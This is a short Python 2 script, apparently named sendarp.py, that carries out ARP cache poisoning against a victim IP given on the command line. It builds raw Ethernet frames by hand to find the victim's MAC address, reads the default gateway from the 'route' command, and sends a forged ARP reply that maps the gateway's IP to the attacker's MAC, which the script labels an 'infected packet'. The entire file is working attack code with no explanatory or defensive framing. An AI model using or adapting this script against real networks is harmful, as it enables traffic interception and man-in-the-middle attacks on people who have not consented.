import socket
from uuid import getnode as get_mac
import subprocess
import sys

def attacker_mac() :
	mac = "%012x" %get_mac() 
	return_val = ''
	for i in range(0, len(mac) / 2) :
		return_val = return_val + chr(int('0x' + mac[i * 2:i * 2 + 2], 16))
	return return_val 

def attacker_ip() : 
	soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
	try :
		soc.connect(("google.com", 80))
	except Exception as e :
		print "fail to connect."
		sys.exit()
	print "success of connection."
	ip = soc.getsockname()[0].split('.')
	return_val = '' 
	for i in ip : 
		return_val = return_val + chr(int(i))
	soc.close()
	return return_val

def find_victim_MAC(victim_ip) :
	soc1 = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
	soc2 = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
	soc1.bind(('ens33', socket.SOCK_RAW))
	pkt = '\xff\xff\xff\xff\xff\xff'
	pkt = pkt + attacker_mac()
	pkt = pkt + '\x08\x06'
	pkt = pkt + '\x00\x01'
	pkt = pkt + '\x08\x00'
	pkt = pkt + '\x06\x04\x00\x01'
	pkt = pkt + attacker_mac()
	pkt = pkt + attacker_ip()
	pkt = pkt + '\x00\x00\x00\x00\x00\x00'
	for i in victim_ip.split('.') :
		pkt = pkt + chr(int(i))
	pkt = pkt + '\x00' * 20
	print "  we are sending ARP Request Packet!"
	soc1.send(pkt)
	data = soc2.recvfrom(80)[0]
	print "  we got ARP Reply packet !"
	pos = 1
	target_MAC = ''
	if data[12] == '\x08' and data[13] == '\x06' and data[20] == '\x00' and data[21] == '\x02' :
		for i in range(6, 12) :
			target_MAC = target_MAC + data[i]

		global find
		find = 0
	else :
		print "Fail!"
	soc1.close()
	soc2.close()
	return target_MAC

def find_gateway() :
	p = subprocess.Popen('route', shell = True, stdout = subprocess.PIPE)
	data = p.communicate()
	sdata = data[0].split()
	gwIp = sdata[sdata.index('default') + 1]
	print "  Gateway IP is " + gwIp
	return gwIp

def send_reply_pkt(victim_ip, target_MAC) :
	soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
	soc.bind(('ens33', socket.SOCK_RAW))
	pkt = target_MAC
	pkt = pkt + attacker_mac()
	pkt = pkt + '\x08\x06'
	pkt = pkt + '\x00\x01'
	pkt = pkt + '\x08\x00'
	pkt = pkt + '\x06\x04\x00\x02'
	pkt = pkt + attacker_mac()
	for i in find_gateway().split('.') :
		pkt = pkt + chr(int(i))
	pkt = pkt + target_MAC
	for i in victim_ip.split('.') :
		pkt = pkt + chr(int(i))
	soc.send(pkt)
	print "Sending infected packet!"

if len(sys.argv) != 2 :
	print "retry like that sendarp.py [victim_ip]"
	exit()	

global find
find = 1

while find :
	target_MAC = find_victim_MAC(sys.argv[1])

print "  FIND TARGET MAC ADDRESS : " + "%02x:%02x:%02x:%02x:%02x:%02x" % (ord(target_MAC[0]), ord(target_MAC[1]), ord(target_MAC[2]), ord(target_MAC[3]), ord(target_MAC[4]), ord(target_MAC[5]))

send_reply_pkt(sys.argv[1], target_MAC)
